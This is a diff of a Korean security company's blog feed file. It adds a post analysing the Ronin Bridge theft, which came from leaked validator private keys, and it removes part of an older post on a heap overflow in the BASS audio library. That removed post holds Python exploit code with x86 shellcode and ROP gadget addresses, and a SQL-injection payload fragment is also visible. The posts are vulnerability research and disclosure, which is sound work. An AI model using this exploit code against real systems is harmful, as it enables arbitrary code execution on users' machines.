@@ -1,4 +1,98 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://ufo.stealien.com/id/feed.xml" rel="self" type="application/atom+xml" /><link href="http://ufo.stealien.com/id/" rel="alternate" type="text/html" /><updated>2022-03-16T11:02:47+09:00</updated><id>http://ufo.stealien.com/feed.xml</id><title type="html">STEALIEN Technical Blog</title><subtitle>첨단기술을 간편하게 제공하는 기업, 스틸리언이 운영하는 기술블로그입니다.</subtitle><entry xml:lang="ko"><title type="html">DirtyPipe Review</title><link href="http://ufo.stealien.com/id/2022-03-15/dirtypipe-review" rel="alternate" type="text/html" title="DirtyPipe Review" /><published>2022-03-15T00:00:00+09:00</published><updated>2022-03-15T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-03-15/DirtyPipe-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-03-15/dirtypipe-review">&lt;h1 id=&quot;dirtypipe-review&quot;&gt;DirtyPipe Review&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://ufo.stealien.com/id/feed.xml" rel="self" type="application/atom+xml" /><link href="http://ufo.stealien.com/id/" rel="alternate" type="text/html" /><updated>2022-04-12T17:13:43+09:00</updated><id>http://ufo.stealien.com/feed.xml</id><title type="html">STEALIEN Technical Blog</title><subtitle>첨단기술을 간편하게 제공하는 기업, 스틸리언이 운영하는 기술블로그입니다.</subtitle><entry xml:lang="ko"><title type="html">Ronin Bridge Vulnerability Analysis</title><link href="http://ufo.stealien.com/id/2022-04-12/ronin-bridge-vuln-analysis" rel="alternate" type="text/html" title="Ronin Bridge Vulnerability Analysis" /><published>2022-04-12T00:00:00+09:00</published><updated>2022-04-12T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-04-12/Ronin-Bridge-Vuln-Analysis-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-04-12/ronin-bridge-vuln-analysis">&lt;h1 id=&quot;ronin-bridge-취약점-분석&quot;&gt;Ronin Bridge 취약점 분석&lt;/h1&gt;
+
+&lt;h2 id=&quot;요약&quot;&gt;요약&lt;/h2&gt;
+&lt;p&gt;Ethereum의 side-chain인 ‘Ronin Network’가 해킹을 당해 6억1500만달러(약 7400억원) 규모의 Ethereum이 탈취된 사건이 최근 알려졌다. 이 글에서는 Ronin Network가 무엇인지 알아보고 어떤 요소때문에 자금이 유출된건지, 대응은 어떻게 하고있는지에 대해서 알아본다&lt;/p&gt;
+
+&lt;h2 id=&quot;ronin-network&quot;&gt;Ronin Network?&lt;/h2&gt;
+&lt;p&gt;유명인기게임 “Axie Infinity”를 개발한 베트남의 “Sky mavis”라는 회사에서 Ethereum Network의 높은 수수료와 낮은 처리속도를 보완하기 위한 Side chain으로 등장했다.&lt;/p&gt;
+
+&lt;h2 id=&quot;side-chain&quot;&gt;Side Chain?&lt;/h2&gt;
+&lt;p&gt;사이드체인은 서로 다른 블록체인들 위에 존재하는 자산들을 쉽게 거래할 수 있도록 하는 기술이다. 
+만약 모든 데이터를 Main Chain의 노드 안에 넣어 처리한다면 노드의 처리속도를 점점 느리게할 것이며, Main Chain에서 점점 많아지는 노드의 수로 인해서 발생하는 합의시간의 증가는 메인체인에서의 많은 문제점을 야기할 것이다..&lt;/p&gt;
+
+&lt;p&gt;TPS는 점점 느려질 수 밖에 없고 수수료의 값은 점점 올라가게 되는 것이다.&lt;/p&gt;
+
+&lt;p&gt;이러한 문제로 암호화폐의 상용성에 대해 많은 문제제기를 하게 되고 이에 대한 해결책으로 사이드체인이 등장하게 되었다.&lt;/p&gt;
+
+&lt;p&gt;Main Chain에 있는 자산을 Side Chain으로 옮겨 Transaction을 처리한다.&lt;/p&gt;
+
+&lt;p&gt;Side Chain에서 복수의 Transaction이 모두 끝나면 다시 중요한 정보만을 Main Chain로 보내주고 저장함으로써 Transaction을 상당히 간소화시킬 수 있다.&lt;/p&gt;
+
+&lt;p&gt;즉, Main Chain에서 모든 Transaction을 처리하는 것이 아니라 Side Chain이 Main Chain이 할 일을 나누어 도와주는 것이라고 할 수 있다.&lt;/p&gt;
+
+&lt;h2 id=&quot;무슨일이-일어난건가&quot;&gt;무슨일이 일어난건가?&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;The Ronin bridge has been exploited for 173,600 Ethereum and 25.5M USDC. The Ronin bridge and Katana Dex have been halted.
+(Twitter @Ronin_Network)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;위의 트윗 내용에 따르면 173,600 Ethereum과 25.5M USDC가 유출되었다고 하며, 이를 확인한 즉시 Ronin Bridge와 Katana Dex는 운영을 중단했다고 한다.&lt;/p&gt;
+
+&lt;p&gt;다소 놀라운 것은 Ronin Bridge에서 자금이 유출되고 6일이 경과한 후에 일반 사용자가 자신의 자산을 출금하지 못한다는 문의로 인해 사고의 발생을 알게된 것이다.&lt;/p&gt;
+
+&lt;h2 id=&quot;어떻게-발생한건가&quot;&gt;어떻게 발생한건가?&lt;/h2&gt;
+&lt;p&gt;Ronin network는 Ethereum network의 side chain으로써 기본적으로 Ethereum network에서 발생하는 다량의 transaction을 Ethereum network보다 비교적 속도가 빠르고 낮은 수수료를 소비하는 Ronin network에서 처리하고 그 결과만을 Ethereum network에 반영한다.&lt;/p&gt;
+
+&lt;p&gt;이러한 과정 중에 서로 다른 network로부터 오고가는 transaction의 유효성을 검증하기 위해서 validator라는 요소를 두게 된다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-04-12-Ronin-Bridge-Vuln-Analysis/image.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;위 사진은 블록체인 트릴레마라고 불리우는 난제이며, 모든 블록체인 네트워크에서 위 사진의 3가지를 효과적으로 해결할 수 있는 것을 목표로 하고 있다.&lt;/p&gt;
+
+&lt;p&gt;Ronin network에서 validator의 수를 결정할 때 블록체인 트릴레마에 대한 것을 생각해보면 Security와 Scalability는 trade-off관계임을 알 수 있다.&lt;/p&gt;
+
+&lt;p&gt;validator의 수를 많이 두자니 보안이 향상될 것이나 성능이 저하될 것이고, validator의 수를 적게 두자니 성능이 향상될 것이나 성능이 저하될 것이다.&lt;/p&gt;
+
+&lt;p&gt;이러한 이유로 인해서 Ronin network에서는 어느정도 보안을 포기하고 성능을 챙기려고 했던건지 validator의 수를 적게 둔 것이 취약점의 시발점이었다.&lt;/p&gt;
+
+&lt;p&gt;보안사고가 터진 것을 인식하기 전 Ronin network는 총 9개의 validator로 구성되어있었고, 5개의 validator 이상이 승인하면 유효한 transaction으로 승인되었다.&lt;/p&gt;
+
+&lt;p&gt;여기서 공격자는 validator 4개의 private key를 갖고있었고 특정 방법(?, Ronin network의 rpc node를 통해 axie dao 소유의 validator private key에 접근할 수 있는 백도어가 있었다고하는데 정확한 보고서나 직접 확인을 하기 위한 RPC Node 주소가 공개되어있지 않은듯함.)으로 인해서 Axie DAO가 운영하는 validator의 private key를 얻을 수 있었으며, 이를 악용하여 Ronin network에서는 실제로 자산이 없는데 자산이 있는 것처럼 속여 Ethereum network로 transaction을 보냈다.&lt;/p&gt;
+
+&lt;p&gt;Ethereum network에 존재하는 Ronin Network Contract는 이를 정상적인 transaction으로 인식하여 지정된 수신자에게 
+&lt;a href=&quot;https://etherscan.io/tx/0xc28fad5e8d5e0ce6a2eaf67b6687be5d58113e16be590824d6cfa1a94467d0b7&quot;&gt;173,600 Ethereum&lt;/a&gt;과 &lt;a href=&quot;https://etherscan.io/tx/0xed2c72ef1a552ddaec6dd1f5cddf0b59a8f37f82bdda5257d9c7c37db7bb9b08&quot;&gt;25.5M USDC&lt;/a&gt;를 송신했다.&lt;/p&gt;
+
+&lt;p&gt;Ronin Network에서 자금을 유출하기 위해서 사용한 validator의 주소는 다음과 같다.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://explorer.roninchain.com/address/0x11360eacdedd59bc433afad4fc8f0417d1fbebab/txs&quot;&gt;0x11360eacdedd59bc433afad4fc8f0417d1fbebab&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://explorer.roninchain.com/address/0x1a15a5e25811fe1349d636a5053a0e59d53961c9/txs&quot;&gt;0x1a15a5e25811fe1349d636a5053a0e59d53961c9&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://explorer.roninchain.com/address/0x70bb1fb41c8c42f6ddd53a708e2b82209495e455/txs&quot;&gt;0x70bb1fb41c8c42f6ddd53a708e2b82209495e455&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://explorer.roninchain.com/address/0xb9e59d56fd1632fc250935182bdd5c59188b2302/txs&quot;&gt;0xb9e59d56fd1632fc250935182bdd5c59188b2302 | Axie DAO&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://explorer.roninchain.com/address/0xf224beff587362a88d859e899d0d80c080e1e812/txs&quot;&gt;0xf224beff587362a88d859e899d0d80c080e1e812&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;분석을 하면서 나온 결론은 해당 사고는 Smart Contract Code Level에서 발생한 것이 아니라 Ronin Network의 한축을 담당하고 있는 validator의 private key 유출로 인해서 벌어진 일이라는 것이다.&lt;/p&gt;
+
+&lt;h2 id=&quot;범인을-특정할-수-있을까&quot;&gt;범인을 특정할 수 있을까?&lt;/h2&gt;
+&lt;p&gt;아래의 주소는 공개된 공격자의 지갑 주소이다.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://etherscan.io/address/0x098b716b8aaf21512996dc57eb0615e2383e2f96&quot;&gt;0x098b716b8aaf21512996dc57eb0615e2383e2f96&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;보통 블록체인 상에서 보안사고가 발생하면 공격자는 유출한 금액을 Tornado.cash나 다른 mixer를 이용해서 자금의 추적을 어렵게하는데 해당 사고의 공격자는 상당히 대범하게 곧바로 binance, FTX, huobi의 핫월렛에 입금하는 것을 볼 수 있다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://etherscan.io/tx/0xe0669bbaaa12cf5ecc682848ddc373a9b86e1351bccc01092b744099bf52a87d&quot;&gt;Binance Hotwallet에서 1 Ether 출금하는 Transaction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://etherscan.io/tx/0x075df6c4b44733a0e76aa4947b56b4c0c00ec136d7865edc1ac7068264e15704&quot;&gt;Huobi Hotwallet으로 입금하는 Transaction list&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://etherscan.io/address/0x5b5082214d62585d686850ab8d9e3f6b6a5c58ff&quot;&gt;FTX Hotwallet으로 입금하는 Transaction list&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;입출금한 거래소가 KYC를 요구하는 거래소라는 점을 생각해볼 때 얼마 지나지않아 공격자의 신원이 특정될 것으로 예상한다.&lt;/p&gt;
+
+&lt;h2 id=&quot;어떻게-조치를-하고있는가&quot;&gt;어떻게 조치를 하고있는가?&lt;/h2&gt;
+&lt;p&gt;우선 9개의 validator 중 공격에 사용된 validator의 권한을 정지시켰으며, 기존에 9개의 validator 중 5개의 validator만 승인했던 것에서 8개 이상의 validator가 승인해야만 정상적인 transaction 승인 받도록 변경되었다.&lt;/p&gt;
+
+&lt;p&gt;이것은 미봉책에 불과하며, 향후 validator의 수를 늘릴 것으로 공표했다.&lt;/p&gt;
+
+&lt;h2 id=&quot;비슷한-유형의-사건이-있을까&quot;&gt;비슷한 유형의 사건이 있을까?&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.theblockcrypto.com/post/140554/convex-finance-addresses-bug-that-couldve-led-to-a-15-billion-rug-pull&quot;&gt;Convex Finance addresses bug that could’ve led to a $15 billion rug pull&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;정리하며&quot;&gt;정리하며&lt;/h2&gt;
+&lt;p&gt;기존에 본인이 분석해왔던 블록체인 쪽의 보안사고와는 다소 다른 유형의 사고였다.
+지금까지 Smart contract의 Code level상의 취약점만 보다가 Architecture 상 중요한 역할을 하는 EOA의 private key가 유출되어서 그것이 플랫폼 자금의 유출로 이어지는 사건은 처음 분석해보았다.
+이로 인해 느낀점은 Smart Contract상에서 Code 뿐만 아니라 구성하고있는 EOA에 대한 보안도 신경써서 관리해야함을 다시한번 깨달았다.&lt;/p&gt;</content><author><name>한호정</name></author><category term="R&amp;D" /><summary type="html">Ronin Bridge 취약점 분석</summary></entry><entry xml:lang="ko"><title type="html">DirtyPipe Review</title><link href="http://ufo.stealien.com/id/2022-03-15/dirtypipe-review" rel="alternate" type="text/html" title="DirtyPipe Review" /><published>2022-03-15T00:00:00+09:00</published><updated>2022-03-15T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-03-15/DirtyPipe-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-03-15/dirtypipe-review">&lt;h1 id=&quot;dirtypipe-review&quot;&gt;DirtyPipe Review&lt;/h1&gt;
 
 &lt;hr /&gt;
 
@@ -2659,142 +2753,4 @@ where 1=0 union/*asdfasdfsadfsadfsa*/select
 
 &lt;p&gt;어떤 소프트웨어라도 취약점이 존재할 수 있다. 이것을 발견할 수 있는 가장 중요한 요인 중 하나는 해커의 마음가짐이라고 생각한다.&lt;/p&gt;
 
-&lt;p&gt;special thx to @munsiwoo&lt;/p&gt;</content><author><name>윤석찬</name></author><category term="R&amp;D" /><summary type="html">Javascript Prototype Pollution in REALWORD</summary></entry><entry><title type="html">Audio Library vulnerability analysis</title><link href="http://ufo.stealien.com/id/2020-11-26/audio_lib_exploit" rel="alternate" type="text/html" title="Audio Library vulnerability analysis" /><published>2020-11-26T15:00:00+09:00</published><updated>2020-11-26T15:00:00+09:00</updated><id>http://ufo.stealien.com/2020-11-26/audio_lib_exploit</id><content type="html" xml:base="http://ufo.stealien.com/2020-11-26/audio_lib_exploit">&lt;h1 id=&quot;audio-library-vulnerability-analysis&quot;&gt;Audio Library vulnerability analysis&lt;/h1&gt;
-
-&lt;p&gt;3-4년전에 찾아서 제보했던 오디오 라이브러리에 대한 취약점 분석글입니다.&lt;/p&gt;
-
-&lt;p&gt;BASS는 MP3,ACC,M4P,FLAC,OGG,WAV 등 여러가지 확장자를 지원하는 오디오 라이브러리입니다. 다수 프로그램이 현재까지도 사용하고 있습니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;취약점-분석&quot;&gt;취약점 분석&lt;/h2&gt;
-
-&lt;h3 id=&quot;개요&quot;&gt;개요&lt;/h3&gt;
-
-&lt;p&gt;Audio File을 파싱하던중  data 필드 부분에서 integer overflow가 발생합니다. integer overflow를 통해 복사하는 데이터의 길이보다 작은 값을 힙할당 하게 되어 Heap overflow로 이어집니다.&lt;/p&gt;
-
-&lt;h3 id=&quot;분석&quot;&gt;분석&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2020-11-26-audio_lib_exploit/image-20201117134210220.png&quot; alt=&quot;image-20201117134210220&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;*sub_110249B6 (strlen)&lt;/p&gt;
-
-&lt;p&gt;*sub_11001009 (heap alloc)&lt;/p&gt;
-
-&lt;p&gt;*sub_110031E6 (File Read)&lt;/p&gt;
-
-&lt;p&gt;첫번째 박스에서 v4가 파일에서 읽어온 값입니다. (v4-7+3)&amp;amp;0xFC만큼 스택을 할당하고 파일에서 읽어와 해당스택에 저장합니다. 그리고 두번째 박스에서 data 필드를 파싱할때 힙할당시 계산되는 사이즈부분에서 검증미흡으로 integer overflow가 발생하게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;v66은 파일에서 가져온 값이며, v8은 첫번째 박스에서 할당한 스택에 있는 내용의 길이입니다. 둘의 값을 잘 조절하면, 0xffffffff의 값을 넘기게 하여 v66보다 작은값을 할당 할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;v66-16 사이즈만큼 파일 데이터를 읽오다 sub_110031E6 내부에서 Heap overflow가 발생하게 됩니다.&lt;/p&gt;
-
-&lt;h3 id=&quot;exploit&quot;&gt;Exploit&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2020-11-26-audio_lib_exploit/image-20201117140035807.png&quot; alt=&quot;image-20201117140035807&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;sub_110031E6 내부에서 qmemcpy로  파일내용을 복사한 이후에, sub_11003749가 호출됩니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2020-11-26-audio_lib_exploit/image-20201117140119996.png&quot; alt=&quot;image-20201117140119996&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;sub_11003749 함수에서 (*(a1+0x30)) 함수포인터가 호출되게 됩니다. 이때 Heap overflow로 인해 *(a1+0x30)의 값을 마음대로 조작 할 수 있게 되어 EIP 컨트롤을 할 수 있게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2020-11-26-audio_lib_exploit/image-20201117141031393.png&quot; alt=&quot;image-20201117141031393&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;WinDbg를 통해 디버깅을 진행해보았습니다. 함수 포인터를 호출할때, 스택상황을 보면, ESP에서 0x48만큼 떨어진거리에 아까 스택할당후 저장한 파일데이터가 존재하는것을 확인 할 수 있습니다.  해당부분에 ROP Chain을 구상하고,  “add esp,0x~~;ret” 와 같은 가젯을 사용하여 ROP Chain을 실행시켰습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2020-11-26-audio_lib_exploit/image-20201117141227737.png&quot; alt=&quot;image-20201117141227737&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Virtual_alloca API를 통해 rwx 권한을 주고, 그공간에 쉘코드를 복사하고 점프하여 실행시키는 ROP Chain을 작성하였습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2020-11-26-audio_lib_exploit/image-20201117141641705.png&quot; alt=&quot;image-20201117141641705&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;BASS 라이브러리를 사용하고 A사 프로그램에서 테스트 하였습니다. (패치완료됨)&lt;/p&gt;
-
-&lt;p&gt;익스플로잇 파일을 읽으면 쉘코드(calc.exe)가 실행되는것을 볼 수 있습니다.&lt;/p&gt;
-
-&lt;h3 id=&quot;exploit-code&quot;&gt;Exploit Code&lt;/h3&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;L&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sub_eax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7\xeb\xfe&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;#rop_gadget
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6350cbbc&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# mov dword ptr [eax], ecx ; pop esi ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_ecx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x635070f2&lt;/span&gt; 
-&lt;span class=&quot;n&quot;&gt;inc_eax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x63506ad8&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;jmp_eax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x63506dad&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# push eax ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_esp_13c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x63503f0b&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# : add esp, 0x13c ; ret   0x13c-0x48
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;virtual_alloc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6350f0a4&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ppppr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x63507389&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop edi ; pop esi ; pop ebx ; pop ebp ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_eax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x63507228&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#: pop eax ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_ecx_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6070fff1&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#: push dword ptr [ecx] ; add byte ptr [eax], al ; ret 0xc
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mov_eax_ebx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x63507484&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#: mov eax, ebx ; pop esi ; pop ebx ; pop ebp ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_eax_20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6350db86&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#: sub eax, 0x20 ; pop ebx ; ret
-&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x90\x90\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inc_eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inc_eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inc_eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;loop_cpy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inc_eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
